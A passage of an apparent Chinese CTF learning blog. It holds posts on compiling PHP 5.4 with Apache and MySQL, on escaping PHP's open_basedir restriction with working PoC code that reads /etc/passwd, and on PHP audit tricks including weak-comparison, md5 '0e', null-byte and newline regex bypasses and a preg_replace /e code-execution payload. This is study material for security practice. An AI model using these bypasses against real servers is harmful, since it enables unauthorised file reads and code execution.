class="line">./configure --prefix=/home/php/php5445 --exec-prefix=/home/php/php5445/execdir --with-apxs2</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="comment"># 下面这个命令是make install 后提示的命令，不知道具体是什么作用</span></span><br><span class="line">/usr/share/apr-1.0/build/libtool --finish /root/php-5.4.45/libs</span><br><span class="line"><span class="comment"># 创建 php.ini 文件</span></span><br><span class="line"><span class="built_in">mv</span> /root/php-5.4.45/php.ini-development /home/php/php5445/execdir/lib/php.ini</span><br><span class="line"><span class="comment"># 配置环境变了</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/home/php/php5445/execdir/bin/:<span class="variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="comment"># 刷新环境</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>

<ul>
<li>安装目录在 <code>/home/php/php5445</code></li>
<li>执行文件目录在 <code>/home/php/php5445/execdir/bin</code></li>
</ul>
<p>由于我们并没有附带任何其他参数，执行的是 PHP 的默认安装，所以只安装了如下模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Core ctype <span class="built_in">date</span> dom ereg fileinfo filter <span class="built_in">hash</span> iconv json libxml pcre PDO pdo_sqlite Phar posix Reflection session SimpleXML SPL sqlite3 standard tokenizer xml xmlreader xmlwriter</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>我们使用默认配置编译php，如果需要安装其他扩展，可能需要如下库。（下文我们会示例介绍如何编译安装mysql扩展）</li>
</ol>
<h2 id="如何编译其他模块"><a href="#如何编译其他模块" class="headerlink" title="如何编译其他模块"></a>如何编译其他模块</h2><p>对于日常可能用的模块，我们需要先下载如下库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install zlib1g-dev libbz2-dev libcurl4-openssl-dev openssl libssl-dev libpng-dev libjpeg-dev libmcrypt-dev libedit-dev libreadline-dev libmysqlclient-dev</span><br></pre></td></tr></table></figure>

<ul>
<li><code>libedit-dev libreadline-dev</code> 是 <code>php -a</code> 也就是 php 交互模式需要的库 (readline 模块)</li>
</ul>
<p>我会在下文示例编译安装 pdo_mysql 库，其他库的安装大同小异。</p>
<h1 id="配合apache2"><a href="#配合apache2" class="headerlink" title="配合apache2"></a>配合apache2</h1><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更换监听端口</span></span><br><span class="line">sed -i <span class="string">&#x27;s|Listen 80|Listen 8888|&#x27;</span> /etc/apache2/ports.conf</span><br><span class="line"><span class="comment">#设置php文件处理模块</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;U2VydmVyTmFtZSBsb2NhbGhvc3QKCjxGaWxlc01hdGNoIFwucGhwJD4KICAgIFNldEhhbmRsZXIgYXBwbGljYXRpb24veC1odHRwZC1waHAKPC9GaWxlc01hdGNoPg==&#x27;</span> | <span class="built_in">base64</span> -d &gt;&gt; /etc/apache2/apache2.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为我们编译的php是线程不安全型，所以需要设置一下apache</span></span><br><span class="line">a2dismod mpm_event</span><br><span class="line">a2enmod mpm_prefork</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启apache2</span></span><br><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>

<p>访问 <code>http://ip:8888</code>  成功运行<img src="/../img/1.png"></p>
<h1 id="配合Mysql"><a href="#配合Mysql" class="headerlink" title="配合Mysql"></a>配合Mysql</h1><h2 id="安装-mysql5-7"><a href="#安装-mysql5-7" class="headerlink" title="安装 mysql5.7"></a>安装 <code>mysql5.7</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-client-5.7 mysql-server-5.7 -y</span><br><span class="line"># 输入密码</span><br></pre></td></tr></table></figure>

<h2 id="编译安装-mysqlnd-扩展（必须先安装它）"><a href="#编译安装-mysqlnd-扩展（必须先安装它）" class="headerlink" title="编译安装 mysqlnd 扩展（必须先安装它）"></a>编译安装 <code>mysqlnd</code> 扩展（必须先安装它）</h2><p>如下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入mysql的ext目录</span></span><br><span class="line"><span class="built_in">cd</span> /root/php-5.4.45/ext/mysqlnd</span><br><span class="line"><span class="built_in">mv</span> config9.m4 config.m4</span><br><span class="line">phpize</span><br><span class="line">./configure --with-php-config=$(<span class="built_in">which</span> php-config)</span><br><span class="line"><span class="comment"># 执行 make 命令会出现报错，看下文即可解决，解决后再继续执行如下命令</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上述报错如下:</p>
<p><img src="/../img/2.png"></p>
<p>执行下列命令即可解决</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更换php_mysqlnd_config.h为 config.h</span></span><br><span class="line">sed -i <span class="string">&#x27;s|ext/mysqlnd/php_mysqlnd_config.h|ext/mysqlnd/config.h|&#x27;</span> /root/php-5.4.45/ext/mysqlnd/mysqlnd_portability.h</span><br><span class="line"><span class="comment"># 更换相对路径为绝对路径</span></span><br><span class="line">sed -i <span class="string">&#x27;s|ext/mysqlnd|/root/php-5.4.45/ext/mysqlnd|&#x27;</span> /root/php-5.4.45/ext/mysqlnd/mysqlnd_portabilit.h</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 继续执行命令makemake install# 更改 /home/php/php5445/execdir/lib/php.ini 配置echo extension=mysqlnd.so &gt;&gt; /home/php/php5445/execdir/lib/php.ini</span></span><br></pre></td></tr></table></figure>

<p>执行 <code>php -a</code> 可看到成功加载<img src="/../img/3.png"></p>
<h2 id="编译安装-pdo-msyql-扩展"><a href="#编译安装-pdo-msyql-扩展" class="headerlink" title="编译安装 pdo_msyql 扩展"></a>编译安装 <code>pdo_msyql</code> 扩展</h2><p>执行下列命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 pdo_mysql 源文件夹cd /root/php-5.4.45/ext/pdo_mysql/phpize./configure --with-php-config=$(which php-config) --with-pdo-mysqlmakemake installecho &quot;extension=pdo_mysql.so&quot; &gt;&gt; /home/php/php5445/execdir/lib/php.ini</span></span><br></pre></td></tr></table></figure>

<p>查看php安装的模块 <code>php -m</code> ，成功安装 pdo_mysql 扩展 <img src="/images/6.png"></p>
<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ol>
<li>启动环境</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 启动 mysqlservice mysql restart# 启动 apacheservice apache2 restart</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更改 index.php 代码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;PD9waHANCnRyeSB7DQogICAgJGRiaCA9IG5ldyBQRE8oJ215c3FsOmhvc3Q9MTI3LjAuMC4xO2RibmFtZT1teXNxbCcsICdyb290JywgJ3Jvb3QnKTsNCiAgICBmb3JlYWNoKCRkYmgtPnF1ZXJ5KCdzaG93IGRhdGFiYXNlcycpIGFzICRyb3cpIHsNCiAgICAgICAgcHJpbnRfcigkcm93KTsNCiAgICB9DQogICAgJGRiaCA9IG51bGw7DQp9IGNhdGNoIChQRE9FeGNlcHRpb24gJGUpIHsNCiAgICBwcmludCAiRXJyb3IhOiAiIC4gJGUtPmdldE1lc3NhZ2UoKSAuICI8YnIvPiI7DQogICAgZGllKCk7DQp9DQo/Pg==&quot; |base64 -d &gt; /var/www/html/index.php</span><br></pre></td></tr></table></figure>

<p><img src="/../img/5.png"></p>
<p>访问 <code>curl localhost:8888</code></p>
<p><img src="/../img/1.png"></p>
<p>环境配置成功。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/" data-id="cm0kx5k5k001so8dk0nsigat8" data-title="源码编译安装php和apache" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83/" rel="tag">环境</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-绕过open-basedir" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/%E7%BB%95%E8%BF%87open-basedir/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T04:48:04.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web/">CTF-web</a>►<a class="article-category-link" href="/categories/CTF-web/rce/">rce</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/%E7%BB%95%E8%BF%87open-basedir/">绕过open_basedir</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10070">https://xz.aliyun.com/t/10070</a></p>
<h2 id="利用ini-set和chidr"><a href="#利用ini-set和chidr" class="headerlink" title="利用ini_set和chidr"></a>利用ini_set和chidr</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li>twitter</li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">chdir(<span class="string">&#x27;subDir&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">$a=file_get_contents(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>

<h2 id="利用symlink"><a href="#利用symlink" class="headerlink" title="利用symlink"></a>利用symlink</h2><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul>
<li>twitter</li>
</ul>
<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="number">0777</span>,<span class="literal">TRUE</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html:bar/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;foo/../../../../../../&#x27;</span>,<span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;/var/www/html&#x27;</span>,<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;bar/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>每次要更换文件夹a和bar和foo，不然会报错文件已存在。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其他版本的 php 环境搭建大同小异。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/%E7%BB%95%E8%BF%87open-basedir/" data-id="cm0kx5k5j001qo8dk8mmj7656" data-title="绕过open_basedir" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-php代码审计" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T04:47:42.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web/">CTF-web</a>►<a class="article-category-link" href="/categories/CTF-web/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="php函数漏洞"><a href="#php函数漏洞" class="headerlink" title="php函数漏洞"></a>php函数漏洞</h1><h2 id="1"><a href="#1" class="headerlink" title="(1) = == ==="></a>(1) <code>=</code> <code>==</code> <code>===</code></h2><ul>
<li><code>=</code> 赋值</li>
<li><code>==</code> 与 <code>!=</code> 将类型转为相同类型再比较<ul>
<li>字符串中含 <code>.eE</code> 且满足数值在整数范围解释为 <code>float</code>，但 <code>float</code> 中有不是正常的东西就是 <code>0</code></li>
<li><code>&quot;admin&quot; == 0</code>、<code>&quot;1admin&quot; == 1</code>、<code>&quot;admin1&quot; == 0</code></li>
<li><code>1 + &quot;bob-1.3e3&quot; == 1</code> </li>
<li>以 <code>0e</code> 开头的被默认为 <code>0</code></li>
<li><code>1</code> 表示为 <code>true</code>，<code>0</code> 是 <code>false</code> 和 <code>null</code></li>
<li>数组表示 <code>null</code> 和 <code>false</code></li>
<li><code>true == -1</code> </li>
<li><code>&quot;-1&quot; == -1</code></li>
<li><code>1.0000000000000001 == 1</code></li>
</ul>
</li>
<li><code>===</code> 与 <code>!==</code> 强比较，类型和值都比<ul>
<li><code>array === array</code></li>
<li><code>name[] = a</code></li>
</ul>
</li>
<li>比较漏洞 - 进制比较<ul>
<li><p>在 PHP 中，只要开头为 <code>0X</code> 的字符串会被认为是 16 进制，在弱类型比较漏洞中，16 进制会先被转换成 10 进制再进行比较，所以只要传入一个带有 <code>0x</code> 的字符串也能够与数字进行比较并且返回 <code>true</code>。</p>
</li>
<li><p>在 PHP 中, 如果 <code>bool</code> 和 “任何其他类型” 比较，”任何其他类型” 会转换为 <code>bool</code>。</p>
</li>
<li><p>在 PHP 中当转换为 boolean 时，以下值被认为是 <code>FALSE</code>：</p>
<ol>
<li>布尔值 <code>FALSE</code> 本身</li>
<li>整型值 <code>0</code>（零）</li>
<li>浮点型值 <code>0.0</code>（零）</li>
<li>空字符串，以及字符串 “0”</li>
<li>不包括何元素的数组（注意，一旦包含元素，就算包含的元素只是一个空数组，也是 <code>true</code>）</li>
<li>不包括任何成员变量的对象（仅 PHP 4.0 适用）</li>
<li>特殊类型 <code>NULL</code>（包括尚未赋值的变量）</li>
<li>从空标记生成的 SimpleXML 对象</li>
<li>所有其它值包括 <code>-1</code> 都被认为是 <code>TRUE</code> （包括任何资源）</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="2-intval"><a href="#2-intval" class="headerlink" title="(2) intval"></a>(2) <code>intval</code></h2><ul>
<li>转换为整型，在 PHP5 左右 <code>intval(a)</code> 与 <code>intval(a + 1)</code>，<code>a</code> 传入 <code>2e5</code> 返回 <code>2</code> 和 <code>200001</code></li>
<li><code>intval()</code> 转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，<code>intval()</code> 不会报错而是返回 <code>0</code>。</li>
<li><code>877%00a</code>，再用 <code>intval</code> 函数获取整数部分得到 <code>877</code></li>
</ul>
<h2 id="3-md5"><a href="#3-md5" class="headerlink" title="(3) md5"></a>(3) <code>md5</code></h2><ul>
<li><code>md5 == md5($md5)</code></li>
<li>常见 MD5 加密后为 <code>0e</code> 开头的字符串为：<code>QNKCDZO</code>、<code>s878926199a</code>、<code>s155964671a</code>、<code>s214587387a</code> 等。</li>
<li>因为 <code>md5</code> 函数不能处理数组，加密数组的时候会返回 <code>NULL</code>，对于这种情况也可以用来绕过某些场景，除此之外还有 <code>sha1()</code>&#x2F;<code>strlen()</code>&#x2F;<code>strcmp()</code>&#x2F;<code>strpos()</code>。</li>
<li>对于使用 <code>===</code> 强比较的情况，上述方法均失效。不过可以使用 MD5 加密后的两个完全相等的字符串来进行绕过，可以利用 <code>fastcoll</code> 来生成：<code>fastcoll_v1.0.0.5.exe -p 1.txt -o 1</code></li>
</ul>
<h2 id="4-变量覆盖"><a href="#4-变量覆盖" class="headerlink" title="(4) 变量覆盖"></a>(4) 变量覆盖</h2><ol>
<li><p><strong><code>extract</code></strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">   <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;A&quot;</span>, <span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;B&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;C&quot;</span>);</span><br><span class="line">   <span class="title function_ invoke__">extract</span>(<span class="variable">$array</span>);</span><br><span class="line">   </span><br><span class="line">   - 就会有 `abc` 这几个变量了，并且是 `ABC`。</span><br><span class="line">   - `<span class="title function_ invoke__">extract</span>()` 函数使用数组键名作为变量名，使用数组键值作为变量值，当变量中有同名的元素时，该函数默认将原有的值覆盖掉。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. **`parse_str` 函数**</span><br><span class="line">   ```php</span><br><span class="line">   <span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=uert&amp;age=68&quot;</span>, <span class="variable">$myarr</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>将 <code>name</code> 和 <code>age</code> 传入数组中  </li>
<li><code>parse_str</code> 函数将字符串解析成多个变量，如果设置了第二个变量 <code>result</code>，变量将会以数组元素的形式存入到这个数组，作为替代。</li>
</ul>
</li>
<li><p><strong><code>$$</code> 变量覆盖</strong></p>
<ul>
<li><code>$$</code> 变量覆盖要具体结合代码来看，可能会需要借助某个参数进行传递值，也有可能使用 <code>$GLOBALS</code>（引用全局作用域中可用的全部变量）来做题。</li>
</ul>
</li>
</ol>
<h2 id="5-伪随机数"><a href="#5-伪随机数" class="headerlink" title="(5) 伪随机数"></a>(5) 伪随机数</h2><ul>
<li><code>mt_rand</code></li>
<li><code>mt_srand</code></li>
</ul>
<h2 id="6-ereg"><a href="#6-ereg" class="headerlink" title="(6) ereg()"></a>(6) <code>ereg()</code></h2><ul>
<li>字符串对比解析，<code>ereg</code> 函数存在 <code>NULL</code> 截断漏洞，当 <code>ereg</code> 读取字符串时, 如果遇到了 <code>%00</code>，后面的字符串就不会被解析。</li>
<li>注：这里的 <code>%00</code> 是需要 <code>urldecode</code> 才可以截断的，这是 URL 终止符，且 <code>%00</code> 长度是 1 不是 3。</li>
</ul>
<h2 id="7-is-numeric"><a href="#7-is-numeric" class="headerlink" title="(7) is_numeric()"></a>(7) <code>is_numeric()</code></h2><ul>
<li>利用数组 + 十六进制来进行绕过：<code>a[]=58B</code> 在 PHP 4.x 和 5.x 中导致这个数组元素被误处理为数字。</li>
<li>对于空字符 <code>%00</code>，无论是 <code>%00</code> 放在前后都可以判断为非数值，而 <code>%20</code> 空格字符只能放在数值后如 <code>58%20s_numeric()</code> 仍然会认为它是一个数字。</li>
<li>16 进制也可以绕过 <code>is_numeric()</code> 检验，可以用来绕过 SQL 注入里的过滤。</li>
<li>对于科学计数法来说转换后会保留 <code>e</code> 前面的数字，所以我们可以利用这个特性绕过。例如：<code>?time=0.5276e7</code></li>
</ul>
<h2 id="8-str-replace-find-replace-string-count"><a href="#8-str-replace-find-replace-string-count" class="headerlink" title="(8) str_replace(find, replace, string, count)"></a>(8) <code>str_replace(find, replace, string, count)</code></h2><ul>
<li>将匹配到的字符串替换为指定内容，不过这个函数可以通过双写来绕过这个替换，利用该特性可以绕过一些关键字替换的情况。</li>
</ul>
<h2 id="9-preg-replace-pattern-replacement-subject-limit-count"><a href="#9-preg-replace-pattern-replacement-subject-limit-count" class="headerlink" title="(9) preg_replace(pattern, replacement, subject, limit, count)"></a>(9) <code>preg_replace(pattern, replacement, subject, limit, count)</code></h2><ul>
<li><p>函数的 <code>/e</code> 匹配模式存在命令执行漏洞，不过单纯的替换字符串来说它并不存在双写绕过这种缺陷。</p>
</li>
<li><p><code>/e</code> 修饰符表示执行替换中的 PHP 代码（这是 PHP 5.5 之前的一个特性，现在已经被弃用），<code>/i</code> 修饰符表示匹配时忽略大小写。</p>
</li>
<li><p>例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br></pre></td></tr></table></figure>
<p><code>&#39;strtolower(&quot;\\1&quot;)&#39;</code> 是替换部分，其中 <code>\\1</code> 代表第一个捕获组的内容，这里的作用是将匹配到的文本转换为小写。</p>
</li>
<li><p>我们让它变成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="10-if-preg-match-php-im-a"><a href="#10-if-preg-match-php-im-a" class="headerlink" title="(10) if(preg_match(&#39;/^php$/im&#39;,$a))"></a>(10) <code>if(preg_match(&#39;/^php$/im&#39;,$a))</code></h2><ul>
<li><code>/m</code> 为多行匹配，<code>/i</code> 不区分大小写，<code>/^php$/</code> <code>^</code> 表示以 <code>php</code> 开头和 <code>$</code> 表示以 <code>php</code> 结尾。</li>
<li>当出现 <code>%0A</code> 的时候会被当做两行处理，此时只匹配一行，后面的行会自动被忽略。实现绕过。</li>
<li>如果目标字符串中没有 <code>&quot;\n&quot;</code> 字符，或者模式中没有出现 <code>^</code> 或 <code>$</code>，设置这个修饰符不产生任何影响。</li>
<li>如果正则表达式是 <code>^xxx$</code>，在末尾加个换行符 <code>%0A</code> 就和没加一样在匹配中，但在对比中就不一样了，利用与匹配和对比中的矛盾。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Match found!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No match!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 访问以下 URL</span></span><br><span class="line"><span class="comment">// http://example.com/script.php?debu=aqua_is_cute%0A</span></span><br><span class="line"><span class="comment">// 输出结果: Match found!</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>preg_match(pattern, subject, matches, flags, offset);</code><ul>
<li><p><code>pattern</code>: 正则表达式模式，用于描述你想要匹配的文本格式。通常用斜杠 <code>/</code> 来包围正则表达式。</p>
<ul>
<li><p><code>subject</code>: 要搜索的字符串。</p>
</li>
<li><p><code>matches</code>: （可选）数组，返回匹配结果。如果有匹配，<code>matches[0]</code> 包含完全匹配的部分，<code>matches[1]</code> 包含第一个捕获组的匹配内容，依此类推。</p>
</li>
<li><p><code>flags</code>: （可选）控制匹配行为的标志，例如是否匹配所有结果（<code>PREG_OFFSET_CAPTURE</code>）。</p>
</li>
<li><p><code>offset</code>: （可选）指定从字符串的哪个位置开始搜索。</p>
<ul>
<li>常见匹配规则：<ul>
<li><strong>字符类</strong>：匹配特定字符集中的任意字符。<ul>
<li><code>[A-Za-z0-9]</code>：匹配任意字母（大写或小写）或数字。</li>
<li><code>[0-9]</code>：匹配任意数字。</li>
<li><code>[A-Z]</code>：匹配任意大写字母。</li>
<li><code>[a-z]</code>：匹配任意小写字母。</li>
</ul>
</li>
<li><strong>数量限定符</strong>：<ul>
<li><code>+</code>：匹配前一个字符一次或多次（1次或以上）。</li>
<li><code>*</code>：匹配前一个字符零次或多次（0次或以上）。</li>
<li><code>?</code>：匹配前一个字符零次或一次（0次或1次）。</li>
<li><code>&#123;n&#125;</code>：匹配前一个字符恰好 n 次。</li>
<li><code>&#123;n,&#125;</code>：匹配前一个字符至少 n 次。</li>
<li><code>&#123;n,m&#125;</code>：匹配前一个字符至少 n 次，但不超过 m 次。</li>
</ul>
</li>
<li><strong>锚点</strong>：<ul>
<li><code>^</code>：匹配字符串的开始。</li>
<li><code>$</code>：匹配字符串的结束。</li>
</ul>
</li>
<li><strong>预定义字符类</strong>:<ul>
<li><code>\d</code> 匹配任意数字（相当于 <code>[0-9]</code>）。</li>
<li><code>\D</code> 匹配任意非数字字符。</li>
<li><code>\w</code> 匹配任意字母、数字或下划线（相当于 <code>[a-zA-Z0-9_]</code>）。</li>
<li><code>\W</code> 匹配任意非字母、非数字或非下划线字符。</li>
<li><code>\s</code> 匹配任意空白字符（空格、制表符等）。</li>
<li><code>\S</code> 匹配任意非空白字符。</li>
</ul>
</li>
<li><strong>量词</strong>:<ul>
<li><code>&#123;n&#125;</code> 精确匹配 n 次。</li>
<li><code>&#123;n,&#125;</code> 至少匹配 n 次。</li>
<li><code>&#123;n,m&#125;</code> 匹配 n 到 m 次。</li>
<li><code>*</code> 匹配零次或多次（相当于 <code>&#123;0,&#125;</code>）。</li>
<li><code>+</code> 匹配一次或多次（相当于 <code>&#123;1,&#125;</code>）。</li>
<li><code>?</code> 匹配零次或一次（相当于 <code>&#123;0,1&#125;</code>）。</li>
<li><code>preg_match(&#39;/a&#123;3&#125;/&#39;, &#39;aaa&#39;)</code> &#x2F;&#x2F; 匹配成功，匹配 “aaa”</li>
<li><code>preg_match(&#39;/a&#123;2,4&#125;/&#39;, &#39;aaaa&#39;)</code> &#x2F;&#x2F; 匹配成功，匹配 “aaaa”</li>
</ul>
</li>
<li><strong>捕获组</strong>:<ul>
